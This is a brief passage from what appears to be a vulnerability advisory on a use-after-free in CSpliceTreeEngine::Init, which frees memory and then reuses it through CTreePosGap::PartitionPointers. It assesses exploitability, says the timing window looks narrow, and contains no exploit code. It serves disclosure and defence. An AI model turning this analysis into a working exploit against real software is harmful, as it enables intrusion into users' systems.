Exploit
-------
From the free & reuse stack, it appears that CSpliceTreeEngine::Init calls
CTreePosGap::PartitionPointers, which frees the memory and returns. Then
CSpliceTreeEngine::Init calls CTreePosGap::PartitionPointers again, which
reuses the memory. This may indicate that there is not enough time between the
free and reuse to modify the contents of the memory. I did not investigate
further.
